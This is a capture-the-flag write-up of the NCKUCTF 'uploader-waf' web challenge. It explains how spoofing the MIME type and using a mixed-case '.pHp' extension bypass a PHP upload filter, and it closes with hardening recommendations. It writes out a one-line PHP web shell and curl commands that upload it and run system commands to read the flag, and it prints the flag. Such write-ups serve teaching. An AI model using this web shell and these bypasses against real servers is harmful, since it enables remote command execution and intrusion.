# Uploader-Waf




{{< admonition tldr "TL;DR" >}}

**uploader-waf** is a web challenge from **NCKUCTF**. * **Challenge Name** : uploader-waf * **Category** : WEB * **Organizer** : NCKUCTF * **Writeup Author** : spawn2pwn

{{< /admonition >}}

## **1. Identity Challenge**

* **Challenge Name** : uploader-waf
* **Category** : WEB
* **Organizer** : NCKUCTF
* **Writeup Writer** : spawn2pwn

---

## **2. Problem Description**

This challenge provides a file upload feature with simple validation:

* Only accepts files with MIME type `image/png` * Forbid files with the extension `.php` The objective of the challenge is to upload a file that can be executed by the server to get the flag.

---

## **3. System Analysis**

Important code snippet:

```php
$file_name = $_FILES['file']['name'];
$extension = pathinfo($file_name, PATHINFO_EXTENSION);
$dest = '/var/www/html/upload/' . $file_name;

if ($_FILES['file']['type'] === "image/png"){
    if ($extension !== "php"){
        move_uploaded_file($_FILES['file']['tmp_name'], $dest);
```

### **Validation performed:**

1. **MIME Type Check**

```php
   $_FILES['file']['type'] === "image/png"
   ```

2. **Extension Check**

```php
   $extension !== "php"
   ```

---

## **4. Identify Vulnerabilities**

### **4.1 MIME Type Trust Issue**

The server only checks:

```php
$_FILES['file']['type']
```

➡️ This is **client controlled**, so it can be faked:

```bash
-F "file=@shell.pHp;type=image/png"
```

---

### **4.2 Case-Sensitive Extension Bypass**

Validation:

```php
$extension !== "php"
```

➡️ It is **case-sensitive**, so:

* `php` ❌ rejected
* `pHp` ✅ passed

---

### **4.3 No File Content Validation**

Server does not check:

* Magic bytes (PNG signature)
* File contents

➡️ Can upload **PHP shell directly**

---

## **5. Exploitation Methodology**

### **5.1 Creating a Web Shell**

```bash
echo "<?php system(\$_GET['cmd']);?>" > shell.pHp
```

---

### **5.2 Upload with MIME Bypass**

```bash
curl -F "file=@shell.pHp;type=image/png" \
https://chall.nckuctf.org:28108/index.php
```

---

### **5.3 Access Uploaded Files**

```
/upload/shell.pHp
```

---

### **5.4 Command Execution**

```bash
curl "https://chall.nckuctf.org:28108/upload/shell.pHp?cmd=whoami"
```

Results:

```
www-data
```

---

### **5.5 Searching for Flags**

```bash
curl "https://chall.nckuctf.org:28108/upload/shell.pHp?cmd=ls /"
```

Found:

```
flag_NCA4jqt
```

---

### **5.6 Reading Flags**

```bash
curl "https://chall.nckuctf.org:28108/upload/shell.pHp?cmd=cat /flag_NCA4jqt"
```

---

## **6. Exploitation Results**

```text
NCKUCTF{w385h311_15_4_427_4nd_m491c}
```

---

## **7. Discussion**

The primary vulnerability:

### **Client-side Trust (MIME Type)**

Server trusts input from user → easy to fake

### **Case-sensitive Filtering**

Does not consider case variations

### **Not Validating File Contents**

No file signature checking (PNG header)

---

## **8. Improvement Recommendations**

### **1. MIME Validation with Server-side Check**

```php
mime_content_type($file)
```

---

### **2. Extension Normalization**

```php
strtolower($extension) !== "php"
```

---

### **3. Whitelist Extension**

```php
$allowed = ['png'];
```

---

### **4. Magic Bytes Validation**

PNG must start with:

```
89 50 4E 47
```

---

### **5. Rename File (Do Not Use Username)**

Use hash/random:

```php
$dest = '/upload/' . sha1_file($file) . '.png';
```

---

## **9. Conclusion**

This challenge shows that:

> Weak file upload validation can be easily bypassed with just simple manipulation

Techniques used:

* MIME spoofing
* Case bypass extension
* Upload webshell

---

## **10. Attachments**

### **Payload**

```bash
echo "<?php system(\$_GET['cmd']);?>" > shell.pHp
```

---

### **Upload**

```bash
curl -F "file=@shell.pHp;type=image/png" \
https://chall.nckuctf.org:28108/index.php
```

---

### **Get Flag**

```bash
curl -s "https://chall.nckuctf.org:28108/upload/shell.pHp?cmd=cat /flag_NCA4jqt"
```


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/uploader-waf/  

